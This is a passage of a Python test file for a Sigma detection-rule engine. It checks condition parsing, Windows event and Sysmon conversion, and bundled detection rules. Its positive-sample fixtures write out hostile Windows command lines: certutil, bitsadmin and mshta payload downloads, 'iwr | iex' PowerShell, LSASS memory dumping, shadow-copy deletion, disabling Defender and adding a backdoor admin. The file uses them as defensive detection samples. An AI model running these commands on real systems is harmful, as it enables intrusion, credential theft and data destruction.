    ("sa or sb and sc", "a", True),  # and binds tighter than or
    ("sb or sa and sc", "a", False),
    ("(sa or sb) and not sc", "a", True), ("(sa or sb) and not sc", "c", False),
    ("not (sa or sb)", "c", True), ("not (sa or sb)", "a", False),
    ("sa OR sb", "b", True), ("sa AND NOT sb", "a", True), ("Sa", "a", None),  # operators are case-insensitive; names are not
    ("((sa))", "a", True),
])
def test_condition_boolean_logic(condition, image, expected):
    if expected is None:  # an unknown (differently cased) selection name makes the rule invalid
        with pytest.raises(S.InvalidRule):
            cond(condition, SELS, {"Image": image})
        return
    assert cond(condition, SELS, {"Image": image}) is expected


GROUPS = {"selection_a": {"Image": "a"}, "selection_b": {"CommandLine": "b"}, "selection_c": {"User": "c"}, "filter_x": {"Image": "x"}}


@pytest.mark.parametrize("condition,event,expected", [
    ("1 of selection*", {"CommandLine": "b"}, True),
    ("1 of selection*", {"Image": "q"}, False),
    ("any of selection*", {"User": "c"}, True),
    ("all of selection*", {"Image": "a", "CommandLine": "b", "User": "c"}, True),
    ("all of selection*", {"Image": "a", "CommandLine": "b"}, False),
    ("2 of selection*", {"Image": "a", "CommandLine": "b"}, True),
    ("2 of selection*", {"Image": "a"}, False),
    ("1 of them", {"Image": "x"}, True),
    ("all of them", {"Image": "a", "CommandLine": "b", "User": "c"}, False),  # filter_x is part of 'them'
    ("1 of selection* and not 1 of filter*", {"Image": "a"}, True),
    ("1 of selection* and not 1 of filter*", {"Image": "x", "User": "c"}, False),
    ("selection_a and 1 of selection_b*", {"Image": "a", "CommandLine": "b"}, True),
    ("1 of (selection_a, selection_b)".replace("1 of (selection_a, selection_b)", "selection_a or selection_b"), {"CommandLine": "b"}, True),
    ("all of selection_* and not filter_x", {"Image": "a", "CommandLine": "b", "User": "c"}, True),
])
def test_condition_quantifiers(condition, event, expected):
    assert cond(condition, GROUPS, event) is expected


def test_them_excludes_underscore_identifiers():
    d = {"selection": {"Image": "a"}, "_helper": {"Image": "zzz"}, "condition": "all of them"}
    assert fires(d, {"Image": "a"})


def test_condition_list_is_or_and_timeframe_is_ignored():
    d = {"a": {"Image": "a"}, "b": {"Image": "b"}, "timeframe": "5m", "condition": ["a and not b", "b"]}
    assert fires(d, {"Image": "a"}) and fires(d, {"Image": "b"}) and not fires(d, {"Image": "c"})


def test_selection_list_of_maps_is_or_of_ands():
    d = {"s": [{"Image|endswith": "\\a.exe", "CommandLine|contains": "x"}, {"Image|endswith": "\\b.exe"}], "condition": "s"}
    assert fires(d, {"Image": "c:\\a.exe", "CommandLine": "x"}) and not fires(d, {"Image": "c:\\a.exe", "CommandLine": "y"})
    assert fires(d, {"Image": "c:\\b.exe"})


def test_explain_reports_positive_selections_only():
    rule = make_rule({"selection_img": {"Image|endswith": "\\a.exe"}, "selection_cmd": {"CommandLine|contains": ["x", "y"]},
                      "filter": {"User": "system"}, "condition": "selection_img and selection_cmd and not filter"})
    ev = {"Image": "C:\\A.EXE", "CommandLine": "run y", "User": "bob", "Extra": "ignored"}
    ((_, matched),) = S.SigmaRuleSet([rule]).match(ev, ignore_logsource=True)
    assert matched == {"Image": "C:\\A.EXE", "CommandLine": "run y"}
    kw = make_rule({"k": ["alpha", "beta*"], "condition": "k"})
    ((_, m),) = S.SigmaRuleSet([kw]).match({"A": "has BETAx and alpha"}, ignore_logsource=True)
    assert m == {"keywords": ["alpha", "beta*"]}
    either = make_rule({"s": [{"Image": "a"}, {"CommandLine": "b"}], "condition": "s"})
    ((_, m),) = S.SigmaRuleSet([either]).match({"CommandLine": "b", "Image": "zz"}, ignore_logsource=True)
    assert m == {"CommandLine": "b"}  # only the sub-map that matched


# =========================================================================== logsource routing

def test_logsource_routing_by_category_service_and_product():
    pcr = make_rule(sel(Image="x"), {"category": "process_creation", "product": "windows"}, id="00000001-0000-0000-0000-000000000000", title="pc")
    reg = make_rule(sel(Image="x"), {"category": "registry_set", "product": "windows"}, id="00000002-0000-0000-0000-000000000000", title="reg")
    regev = make_rule(sel(Image="x"), {"category": "registry_event", "product": "windows"}, id="00000003-0000-0000-0000-000000000000", title="regevent")
    secsvc = make_rule(sel(Image="x"), {"service": "security", "product": "windows"}, id="00000004-0000-0000-0000-000000000000", title="sec")
    lin = make_rule(sel(Image="x"), {"category": "process_creation", "product": "linux"}, id="00000005-0000-0000-0000-000000000000", title="lin")
    anyw = make_rule(sel(Image="x"), {"product": "windows"}, id="00000006-0000-0000-0000-000000000000", title="anywin")
    nop = make_rule(sel(Image="x"), {"category": "process_creation"}, id="00000007-0000-0000-0000-000000000000", title="noproduct")
    rs = S.SigmaRuleSet([pcr, reg, regev, secsvc, lin, anyw, nop])

    def titles(event):
        return sorted(r.title for r, _ in rs.match(event))

    assert titles({"Image": "x", "_category": "process_creation"}) == ["anywin", "noproduct", "pc"]
    assert titles({"Image": "x", "_category": "registry_set"}) == ["anywin", "reg", "regevent"]  # registry_event covers set
    assert titles({"Image": "x", "_category": "registry_delete"}) == ["anywin", "regevent"]
    assert titles({"Image": "x", "_service": "security"}) == ["anywin", "sec"]
    assert titles({"Image": "x", "_service": "SECURITY", "_category": "process_creation"}) == ["anywin", "noproduct", "pc", "sec"]
    assert titles({"Image": "x", "_category": "process_creation", "_product": "linux"}) == ["lin", "noproduct"]
    assert titles({"Image": "x"}) == ["anywin"]  # no routing metadata: only product-wide rules
    assert titles({"Image": "x", "_category": "network_connection"}) == ["anywin"]
    assert [r.title for r, _ in rs.match({"Image": "x"}, ignore_logsource=True)].count("pc") == 1
    assert len(rs.match({"Image": "x"}, ignore_logsource=True)) == 7
    assert rs.candidates({"_category": "registry_set"}) == rs.candidates({"_category": "registry_set"})


def test_ruleset_add_invalidates_candidate_cache_and_replaces_ids():
    rs = S.SigmaRuleSet([make_rule(sel(Image="x"), id="0000000a-0000-0000-0000-000000000000", title="one")])
    ev = {"Image": "x", "_category": "process_creation"}
    assert [r.title for r, _ in rs.match(ev)] == ["one"]
    rs.add(make_rule(sel(Image="x"), id="0000000b-0000-0000-0000-000000000000", title="two"))
    assert sorted(r.title for r, _ in rs.match(ev)) == ["one", "two"]
    rs.add(make_rule(sel(Image="y"), id="0000000a-0000-0000-0000-000000000000", title="one-v2"))
    assert sorted(r.title for r, _ in rs.match(ev)) == ["two"] and len(rs) == 2
    assert S.SigmaRuleSet().match(ev) == []


def test_evaluate_counts_and_deadline():
    rs = S.SigmaRuleSet([make_rule(sel(Image="x"))])
    events = [{"Image": "x", "_category": "process_creation"}, {"Image": "x", "_category": "dns_query"},
              {"Image": "y", "_category": "process_creation"}]
    run = S.evaluate(events, rs)
    assert (run.events, run.evaluated, len(run.matches), run.truncated) == (3, 2, 1, False)
    assert run.matches[0].rule.title == "Test rule" and run.matches[0].matched == {"Image": "x"}
    late = S.evaluate(events * 50, rs, deadline=time.monotonic() - 1)
    assert late.truncated and late.events == 1 and late.matches == []
    assert S.evaluate(events, S.SigmaRuleSet()).events == 0


def test_a_failing_rule_does_not_stop_the_others(monkeypatch):
    bad = make_rule(sel(Image="x"), id="0000000c-0000-0000-0000-000000000000", title="bad")
    good = make_rule(sel(Image="x"), id="0000000d-0000-0000-0000-000000000000", title="good")

    def boom(ev):
        raise RuntimeError("boom")

    bad._check = boom
    rs = S.SigmaRuleSet([bad, good])
    assert [r.title for r, _ in rs.match({"Image": "x", "_category": "process_creation"})] == ["good"]


# =========================================================================== event conversion

T0 = el.parse_time("2026-10-14T10:00:00Z")


def E(event_id, log="Security", t=0, **data):
    return el.make_event(event_id, log, T0 + t, **data)


def conv1(ev):
    (out,) = S.events_from_eventlog([ev])
    return out


def test_convert_security_4688():
    out = conv1(E(4688, NewProcessName=r"C:\Windows\System32\cmd.exe", CommandLine="cmd /c whoami", ParentProcessName=r"C:\Windows\explorer.exe",
                  SubjectUserName="bob", SubjectDomainName="PC", NewProcessId="0x1a4", ProcessId="0x2b8",
                  MandatoryLabel="S-1-16-12288", TokenElevationType="%%1937", Empty=""))
    assert out["_category"] == "process_creation" and out["_service"] == "security" and out["_product"] == "windows"
    assert out["Image"] == r"C:\Windows\System32\cmd.exe" and out["NewProcessName"] == out["Image"]  # Sigma + native names
    assert out["ParentImage"] == r"C:\Windows\explorer.exe" and out["User"] == "PC\\bob"
    assert out["IntegrityLevel"] == "High" and out["ProcessId"] == "0x1a4" and out["ParentProcessId"] == "0x2b8"
    assert out["EventID"] == "4688" and out["Channel"] == "Security" and out["Provider_Name"] == "Microsoft-Windows-Security-Auditing"
    assert out["_log"] == "Security" and out["_event_id"] == 4688 and out["_ts"] == T0
    assert "Empty" not in out and "OriginalFileName" not in out  # empty / unavailable fields are absent, not ''


def test_convert_sysmon_events_keep_native_fields_and_route_by_event_id():
    cases = {1: "process_creation", 3: "network_connection", 7: "image_load", 11: "file_event", 13: "registry_set",
             22: "dns_query", 8: "create_remote_thread", 10: "process_access", 17: "pipe_created", 23: "file_delete"}
    for eid, cat in cases.items():
        out = conv1(E(eid, "Sysmon", Image=r"C:\x.exe", TargetObject="HKLM\\x", Details="d"))
        assert out["_category"] == cat and out["_service"] == "sysmon" and out["Image"] == r"C:\x.exe", eid
        assert out["Channel"] == "Microsoft-Windows-Sysmon/Operational" and out["Provider_Name"] == "Microsoft-Windows-Sysmon"
    assert conv1(E(12, "Sysmon", EventType="CreateKey"))["_category"] == "registry_add"
    assert conv1(E(12, "Sysmon", EventType="DeleteKey"))["_category"] == "registry_delete"
    assert "_category" not in conv1(E(4, "Sysmon"))  # no category for state-change events


def test_convert_system_security_defender_wmi_and_unknown_logs():
    svc = conv1(E(7045, "System", ServiceName="evil", ImagePath=r"C:\x.exe"))
    assert svc["_service"] == "system" and "_category" not in svc and svc["Provider_Name"] == "Service Control Manager"
    assert svc["ImagePath"] == r"C:\x.exe" and svc["EventID"] == "7045"
    assert conv1(E(1102, "Security"))["Provider_Name"] == "Microsoft-Windows-Eventlog"
    assert conv1(E(104, "System"))["Provider_Name"] == "Microsoft-Windows-Eventlog"
    assert conv1(E(4698, TaskName=r"\x", TaskContent="<Task/>"))["TaskName"] == r"\x"
    assert conv1(E(5007, "Defender"))["_service"] == "windefend"
    assert conv1(E(5861, "WMI"))["_service"] == "wmi"
    weird = conv1(E(9, "Custom Log"))
    assert weird["_service"] == "custom log" and weird["Channel"] == "Custom Log"
    prov = conv1(el.make_event(4688, "Security", T0, provider="Custom-Provider", NewProcessName="x"))
    assert prov["Provider_Name"] == "Custom-Provider"
    assert S.events_from_eventlog([{"id": "nope", "log": "Security"}, "junk", {"id": 4688, "log": "Security", "data": {}}]) != []


def test_convert_powershell_4104_reassembles_script_blocks():
    parts = [E(4104, "PowerShell", 2, ScriptBlockId="B1", MessageNumber="2", MessageTotal="2", ScriptBlockText="PART-TWO", Path=""),
             E(4104, "PowerShell", 1, ScriptBlockId="B1", MessageNumber="1", MessageTotal="2", ScriptBlockText="PART-ONE ", Path=r"C:\a.ps1"),
             E(4104, "PowerShell", 3, ScriptBlockId="B2", MessageNumber="1", MessageTotal="1", ScriptBlockText="other")]
    out = S.events_from_eventlog(parts + [E(4688, NewProcessName="x")])
    blocks = {e["ScriptBlockId"]: e for e in out if e.get("_category") == "ps_script"}
    assert set(blocks) == {"B1", "B2"} and len(out) == 3
    assert blocks["B1"]["ScriptBlockText"] == "PART-ONE PART-TWO" and blocks["B1"]["_service"] == "powershell"
    assert blocks["B1"]["_ts"] == T0 + 1 and blocks["B1"]["Provider_Name"] == "Microsoft-Windows-PowerShell"
    assert blocks["B1"]["Path"] == r"C:\a.ps1" and blocks["B1"]["EventID"] == "4104"


XML_4688 = (
    '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System>'
    '<Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}"/>'
    '<EventID>4688</EventID><TimeCreated SystemTime="2026-10-14T10:22:11.1234567Z"/><Channel>Security</Channel>'
    '<Computer>PC</Computer></System><EventData><Data Name="SubjectUserName">bob</Data><Data Name="SubjectDomainName">PC</Data>'
    '<Data Name="NewProcessId">0x5a0</Data><Data Name="NewProcessName">C:\\Windows\\System32\\vssadmin.exe</Data>'
    '<Data Name="CommandLine">vssadmin delete shadows /all /quiet</Data><Data Name="ProcessId">0x100</Data>'
    '<Data Name="ParentProcessName">C:\\Windows\\System32\\cmd.exe</Data><Data Name="MandatoryLabel">S-1-16-12288</Data>'
    '</EventData></Event>')
XML_SYSMON1 = (
    '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System>'
    '<Provider Name="Microsoft-Windows-Sysmon"/><EventID>1</EventID><TimeCreated SystemTime="2026-10-14T10:23:00.000000000Z"/>'
    '<Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>PC</Computer></System><EventData>'
    '<Data Name="Image">C:\\Windows\\System32\\certutil.exe</Data>'
    '<Data Name="CommandLine">certutil -urlcache -f http://203.0.113.5/a.exe a.exe</Data>'
    '<Data Name="OriginalFileName">CertUtil.exe</Data><Data Name="User">PC\\bob</Data><Data Name="IntegrityLevel">High</Data>'
    '<Data Name="ParentImage">C:\\Windows\\System32\\cmd.exe</Data><Data Name="ParentCommandLine">cmd.exe</Data></EventData></Event>')


def test_conversion_from_parsed_eventlog_records_feeds_rules():
    recs = [el.normalize_record({"I": 4688, "X": XML_4688}, "Security"), el.normalize_record({"I": 1, "X": XML_SYSMON1}, "Sysmon")]
    events = S.events_from_eventlog(recs)
    rs = S.load_rules(None)
    got = {e["_log"]: [r.title for r, _ in rs.match(e)] for e in events}
    assert got["Security"] == ["Shadow Copies or Backups Deleted"] and got["Sysmon"] == ["Certutil Used to Download a File"]
    assert events[1]["OriginalFileName"] == "CertUtil.exe" and events[1]["IntegrityLevel"] == "High"


def test_event_from_process_guard_info():
    info = {"pid": 4242, "name": "powershell.exe", "exe": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "cmdline": ["powershell.exe", "-NoProfile", "-File", r"C:\My Scripts\a b.ps1"], "ppid": 100,
            "parent_name": "explorer.exe", "parent_exe": r"C:\Windows\explorer.exe", "parent_cmdline": r"C:\Windows\Explorer.EXE",
            "username": "PC\\bob", "create_time": 1.8e9}
    ev = S.event_from_process(info)
    assert ev["Image"] == info["exe"] and ev["ParentImage"] == r"C:\Windows\explorer.exe" and ev["User"] == "PC\\bob"
    assert ev["CommandLine"] == 'powershell.exe -NoProfile -File "C:\\My Scripts\\a b.ps1"'  # re-quoted like a Windows command line
    assert ev["ParentCommandLine"] == r"C:\Windows\Explorer.EXE" and ev["ProcessId"] == "4242" and ev["ParentProcessId"] == "100"
    assert ev["_category"] == "process_creation" and ev["_product"] == "windows" and ev["_pid"] == 4242 and ev["_ts"] == 1.8e9
    sparse = S.event_from_process({"pid": 7, "name": "calc.exe", "exe": "", "cmdline": [], "ppid": 1, "parent_name": "x", "username": ""}, "linux")
    assert sparse["Image"] == "calc.exe" and sparse["ParentImage"] == "x" and sparse["_product"] == "linux"
    assert "CommandLine" not in sparse and "User" not in sparse and "ParentCommandLine" not in sparse
    assert S.event_from_process({"pid": 1, "name": "a", "cmdline": "a --raw"})["CommandLine"] == "a --raw"


# =========================================================================== findings, caps, collapsing

def test_findings_collapse_repeats_and_cap_low_level_noise():
    rule = make_rule(sel(Image="x"), id="00000010-0000-0000-0000-000000000000", level="high", title="Repeats")
    events = [pc(Image="x", CommandLine="same cmd", _ts=100.0 + i, _log="Security", _event_id=4688) for i in range(5)]
    events.append(pc(Image="x", CommandLine="other cmd", _ts=200.0, _log="Security", _event_id=4688))
    found = S.sigma_findings(events, S.SigmaRuleSet([rule]))
    by_cmd = {f.evidence["event"]["CommandLine"]: f for f in found}
    assert len(found) == 2 and by_cmd["same cmd"].evidence["occurrences"] == 5
    assert by_cmd["same cmd"].evidence["time"] == S._fmt_time(100.0) and by_cmd["same cmd"].evidence["last_seen"] == S._fmt_time(104.0)
    assert by_cmd["other cmd"].evidence["occurrences"] == 1 and len({f.fingerprint for f in found}) == 2

    low = make_rule(sel(Image="x"), id="00000011-0000-0000-0000-000000000000", level="low", title="Noisy")
    many = [pc(Image="x", CommandLine=f"cmd {i}", _ts=float(i)) for i in range(20)]
    got = S.sigma_findings(many, S.SigmaRuleSet([low]))
    assert len(got) == S.MAX_LOW_FINDINGS_PER_RULE and all(f.severity == Severity.LOW for f in got)
    info = make_rule(sel(Image="x"), id="00000012-0000-0000-0000-000000000000", level="informational")
    assert S.sigma_findings(many, S.SigmaRuleSet([info])) == []  # below the default minimum severity
    assert len(S.sigma_findings(many, S.SigmaRuleSet([info]), min_severity=Severity.INFO)) == S.MAX_LOW_FINDINGS_PER_RULE
    hi = make_rule(sel(Image="x"), id="00000013-0000-0000-0000-000000000000", level="high")
    assert len(S.sigma_findings(many, S.SigmaRuleSet([hi]))) == S.MAX_FINDINGS_PER_RULE
    assert len(S.sigma_findings(many, S.SigmaRuleSet([hi]), max_per_rule=100, max_total=7)) == 7
    mixed = S.sigma_findings(many[:3], S.SigmaRuleSet([low, hi]))
    assert [f.severity for f in mixed] == sorted((f.severity for f in mixed), reverse=True)  # most severe first


def test_status_downgrade_applies_to_findings():
    rule = make_rule(sel(Image="x"), level="critical", status="test")
    (f,) = S.sigma_findings([pc(Image="x")], S.SigmaRuleSet([rule]))
    assert f.severity == Severity.HIGH and f.evidence["sigma_status"] == "test" and f.evidence["sigma_level"] == "critical"


def test_fold_and_same_technique_helpers():
    assert S.same_technique(["T1059.001"], ["T1059"]) and S.same_technique(["T1059"], ["T1059.003"])
    assert S.same_technique(["T1003.001"], ["T1003.001"]) and not S.same_technique(["T1059.001"], ["T1059.003"])
    assert not S.same_technique([], ["T1059"]) and not S.same_technique(["T1105"], ["T1218"])
    base = Finding("AEG-X", "native", Severity.MEDIUM, "suspicious", "desc.", mitre=["T1059.001"], evidence={})
    rule = make_rule(sel(Image="x"), level="critical", tags=["attack.t1027.010"], title="Sig")
    sf = S.finding_for_match(rule, {}, {"Image": "x"})
    S.fold_finding(base, sf)
    S.fold_finding(base, sf)  # idempotent
    assert base.severity == Severity.CRITICAL and base.mitre == ["T1059.001", "T1027.010"]
    assert [r["title"] for r in base.evidence["sigma_rules"]] == ["Sig"] and base.description.count("Sigma rule 'Sig'") == 1


# =========================================================================== test_rule_on_events (CLI helper)

def test_test_rule_on_events_with_sigma_events(tmp_path):
    (tmp_path / "r.yml").write_text(rule_yaml("  s:\n    CommandLine|contains: evil\n  condition: s", "Evil cmd"))
    (tmp_path / "e.json").write_text(json.dumps([{"CommandLine": "run EVIL now", "Image": "a.exe"}, {"CommandLine": "calc"}, "junk"]))
    res = S.test_rule_on_events(tmp_path / "r.yml", tmp_path / "e.json")
    assert res["ok"] and res["events"] == 2 and len(res["matches"]) == 1
    m = res["matches"][0]
    assert m["title"] == "Evil cmd" and m["event_index"] == 0 and m["severity"] == "high" and m["matched"] == {"CommandLine": "run EVIL now"}
    assert res["rules"][0]["supported"] is True and m["event"]["Image"] == "a.exe"
    json.dumps(res)
    # events that carry routing metadata are routed: a process_creation rule ignores a registry event
    (tmp_path / "e2.json").write_text(json.dumps([{"CommandLine": "evil", "_category": "registry_set"},
                                                  {"CommandLine": "evil", "_category": "process_creation"}]))
    assert [m["event_index"] for m in S.test_rule_on_events(tmp_path / "r.yml", tmp_path / "e2.json")["matches"]] == [1]
    assert len(S.test_rule_on_events(tmp_path / "r.yml", tmp_path / "e2.json", ignore_logsource=True)["matches"]) == 2


def test_test_rule_on_events_with_eventlog_records_and_directories(tmp_path):
    rules = tmp_path / "rules"
    rules.mkdir()
    (rules / "a.yml").write_text(rule_yaml("  s:\n    CommandLine|contains: delete shadows\n  condition: s", "Shadow"))
    (rules / "b.yml").write_text(rule_yaml("  s:\n    Image|nope: x\n  condition: s", "Unsupported"))
    recs = [el.make_event(4688, "Security", T0, NewProcessName="vssadmin.exe", CommandLine="vssadmin delete shadows /all"),
            el.make_event(4688, "Security", T0, NewProcessName="calc.exe", CommandLine="calc")]
    (tmp_path / "e.json").write_text(json.dumps(recs))
    res = S.test_rule_on_events(rules, tmp_path / "e.json")
    assert res["ok"] and [m["event_index"] for m in res["matches"]] == [0]
    assert [r["supported"] for r in res["rules"]] == [True, False] and res["skipped"][0]["kind"] == "unsupported"


def test_test_rule_on_events_error_paths(tmp_path):
    (tmp_path / "e.json").write_text("[]")
    (tmp_path / "r.yml").write_text("title: [broken")
    assert "YAML error" in S.test_rule_on_events(tmp_path / "r.yml", tmp_path / "e.json")["error"]
    assert not S.test_rule_on_events(tmp_path / "missing.yml", tmp_path / "e.json")["ok"]
    (tmp_path / "ok.yml").write_text(rule_yaml("  s:\n    Image: a\n  condition: s"))
    assert "cannot read events" in S.test_rule_on_events(tmp_path / "ok.yml", tmp_path / "nope.json")["error"]
    (tmp_path / "bad.json").write_text("{not json")
    assert not S.test_rule_on_events(tmp_path / "ok.yml", tmp_path / "bad.json")["ok"]
    (tmp_path / "obj.json").write_text('{"events": [{"Image": "a"}]}')
    assert len(S.test_rule_on_events(tmp_path / "ok.yml", tmp_path / "obj.json")["matches"]) == 1
    (tmp_path / "scalar.json").write_text("42")
    assert "list" in S.test_rule_on_events(tmp_path / "ok.yml", tmp_path / "scalar.json")["error"]
    assert getattr(S.test_rule_on_events, "__test__", True) is False  # never collected by pytest


# =========================================================================== bundled rules

BUNDLED_DIR = Path(S.BUNDLED_DIR)
PS_EXE = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
RETIRED = {"T1562", "T1562.001", "T1562.002", "T1562.004", "T1562.006", "T1562.009", "T1070.001", "T1574.002", "T1656"}


def proc(image, cmd, parent=r"C:\Windows\System32\cmd.exe", **extra):
    return pc(Image=image, CommandLine=cmd, ParentImage=parent, User="PC\\bob", **extra)


POSITIVES = {
    "PowerShell Started With an Encoded Command": [
        proc(PS_EXE, "powershell.exe -NoP -W Hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtAA=="),
        proc(PS_EXE, "powershell -EncodedCommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AA=="),
        proc(r"C:\Program Files\PowerShell\7\pwsh.exe", "pwsh -e JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AA=="),
        proc(r"C:\renamed\x.exe", "x.exe /ec JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AA==", OriginalFileName="PowerShell.EXE"),
    ],
    "Office Application Starts a Shell or Script Engine": [
        proc(r"C:\Windows\System32\cmd.exe", "cmd.exe /c whoami", r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"),
        proc(PS_EXE, "powershell -nop", r"C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"),
        proc(r"C:\Windows\System32\wscript.exe", "wscript x.js", r"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"),
    ],
    "Certutil Used to Download a File": [
        proc(r"C:\Windows\System32\certutil.exe", r"certutil.exe -urlcache -split -f http://203.0.113.5/a.exe C:\Users\bob\a.exe"),
        proc(r"C:\Windows\System32\certutil.exe", r"certutil /urlcache /f https://example.net/a.txt a.txt"),
        proc(r"C:\Windows\System32\certutil.exe", "certutil -verifyctl -f -split http://203.0.113.5/a.dll"),
    ],
    "BITSAdmin Used to Download or Persist a File": [
        proc(r"C:\Windows\System32\bitsadmin.exe", r"bitsadmin /transfer job /download /priority high http://203.0.113.5/a.exe C:\Users\Public\a.exe"),
        proc(r"C:\Windows\System32\bitsadmin.exe", r"bitsadmin /SetNotifyCmdLine job C:\Windows\System32\cmd.exe NUL"),
    ],
    "Mshta or Rundll32 Running Script From a Command-Line URI": [
        proc(r"C:\Windows\System32\mshta.exe", 'mshta.exe vbscript:Execute("CreateObject(""WScript.Shell"").Run ""calc""")'),
        proc(r"C:\Windows\System32\mshta.exe", "mshta http://203.0.113.5/payload.hta"),
        proc(r"C:\Windows\System32\rundll32.exe", 'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write()'),
    ],
    "Shadow Copies or Backups Deleted": [
        proc(r"C:\Windows\System32\vssadmin.exe", "vssadmin.exe delete shadows /all /quiet"),
        proc(r"C:\Windows\System32\vssadmin.exe", "vssadmin resize shadowstorage /for=C: /on=C: /maxsize=401MB"),
        proc(r"C:\Windows\System32\wbem\wmic.exe", "wmic shadowcopy delete"),
        proc(r"C:\Windows\System32\wbadmin.exe", "wbadmin delete catalog -quiet"),
        proc(r"C:\Windows\System32\bcdedit.exe", "bcdedit /set {default} recoveryenabled No"),
        proc(PS_EXE, "powershell Get-WmiObject Win32_ShadowCopy | ForEach-Object {$_.Delete()}"),
    ],
    "LSASS Memory Dumped With Comsvcs or ProcDump": [
        proc(r"C:\Windows\System32\rundll32.exe", r"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 624 C:\Temp\l.dmp full"),
        proc(r"C:\Windows\System32\rundll32.exe", r"rundll32 comsvcs.dll,#24 624 C:\Temp\l.dmp full"),
        proc(r"C:\Tools\procdump64.exe", "procdump64.exe -accepteula -ma lsass.exe l.dmp"),
    ],
    "User Added to the Local Administrators Group With net.exe": [
        proc(r"C:\Windows\System32\net.exe", "net localgroup administrators backdoor /add"),
        proc(r"C:\Windows\System32\net1.exe", "net1 localgroup Administrators bob /ADD"),
        proc(r"C:\Windows\System32\net.exe", "net localgroup *S-1-5-32-544 bob /add"),
    ],
    "Scheduled Task Created to Run From a User-Writable Folder": [
        proc(r"C:\Windows\System32\schtasks.exe", r'schtasks /create /tn Updater /tr "C:\Users\bob\AppData\Local\Temp\u.exe" /sc onlogon'),
        proc(r"C:\Windows\System32\schtasks.exe", r'SCHTASKS.EXE -create -sc minute -tn x -tr C:\Users\Public\x.bat'),
    ],
    "Microsoft Defender Disabled or Broadly Excluded With PowerShell": [
        proc(PS_EXE, "powershell Set-MpPreference -DisableRealtimeMonitoring $true"),
        proc(PS_EXE, "powershell -c Set-MpPreference -DisableBehaviorMonitoring 1"),
        proc(PS_EXE, "powershell -c Add-MpPreference -ExclusionPath C:\\"),
        proc(PS_EXE, 'powershell -c "Add-MpPreference -ExclusionPath \'C:\\Users\'"'),
        proc(PS_EXE, "powershell -c Add-MpPreference -ExclusionPath $env:TEMP"),
        proc(PS_EXE, "powershell -c Add-MpPreference -ExclusionExtension .exe"),
        proc(PS_EXE, "powershell -c Add-MpPreference -ExclusionProcess powershell.exe"),
    ],
    "Microsoft Defender Disabled or Broadly Excluded in a PowerShell Script": [
        {"_category": "ps_script", "ScriptBlockText": "Add-MpPreference -ExclusionPath 'C:\\Users'"},
        {"_category": "ps_script", "ScriptBlockText": "Set-MpPreference -DisableRealtimeMonitoring $True; Write-Host done"},
    ],
    "ClickFix-Style Hidden PowerShell Started From Explorer": [
        proc(PS_EXE, 'powershell -w hidden -c "iwr http://x.example/p | iex"', r"C:\Windows\explorer.exe"),
        proc(PS_EXE, 'powershell.exe -WindowStyle Hidden -Command "irm 203.0.113.9/a | iex"', r"C:\Windows\explorer.exe"),
        proc(PS_EXE, "powershell -nop -win h -c \"(New-Object Net.WebClient).DownloadString('http://x/a')|IEX\"", r"C:\Windows\explorer.exe"),
    ],
    "Suspicious Command Pasted Into the Windows Run Dialog": [
        {"_category": "registry_set", "TargetObject": r"HKU\S-1-5-21-1-2-3-1001\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU\a",
         "Details": 'powershell -w hidden -c "iwr http://x | iex" # I am not a robot - reCAPTCHA Verification ID: 1234\\1'},
        {"_category": "registry_set", "TargetObject": r"HKU\S-1\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU\b",
         "Details": r"mshta https://203.0.113.5/x.hta\1"},
    ],
    "Microsoft Defender Exclusion Added in the Registry": [
        {"_category": "registry_set", "TargetObject": r"HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\C:\Users\bob\Downloads"},
        {"_category": "registry_set", "TargetObject": r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Extensions\.exe"},
    ],
    "Executable or Script Dropped in a Startup Folder": [
        {"_category": "file_event", "TargetFilename": r"C:\Users\bob\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\update.vbs"},
        {"_category": "file_event", "TargetFilename": r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\x.exe"},
    ],
    "Script Host or LOLBin Connected to a Public Address": [
        {"_category": "network_connection", "Image": r"C:\Windows\System32\mshta.exe", "Initiated": "true", "DestinationIp": "203.0.113.5"},
        {"_category": "network_connection", "Image": r"C:\Windows\System32\wscript.exe", "Initiated": "true", "DestinationIp": "2001:db8::1"},
    ],
    "Windows Process Loaded an Unsigned DLL From a User-Writable Folder": [
        {"_category": "image_load", "Image": r"C:\Windows\System32\svchost.exe", "ImageLoaded": r"C:\Users\Public\evil.dll", "Signed": "false"},
        {"_category": "image_load", "Image": r"C:\Windows\explorer.exe", "ImageLoaded": r"C:\Users\bob\AppData\Local\Temp\x.dll", "Signed": "false"},
    ],
    "New Service Runs a Command Shell or Executes From an Admin Share": [
        {"_service": "system", "Provider_Name": "Service Control Manager", "EventID": "7045", "ServiceName": "x", "ImagePath": r"%COMSPEC% /c echo x"},
        {"_service": "system", "Provider_Name": "Service Control Manager", "EventID": "7045", "ServiceName": "x", "ImagePath": r"\\127.0.0.1\ADMIN$\x.exe"},
        {"_service": "system", "Provider_Name": "Service Control Manager", "EventID": "7045", "ServiceName": "PSEXESVC", "ImagePath": r"C:\Windows\PSEXESVC.exe"},
    ],
    "Windows Security Event Log Cleared": [
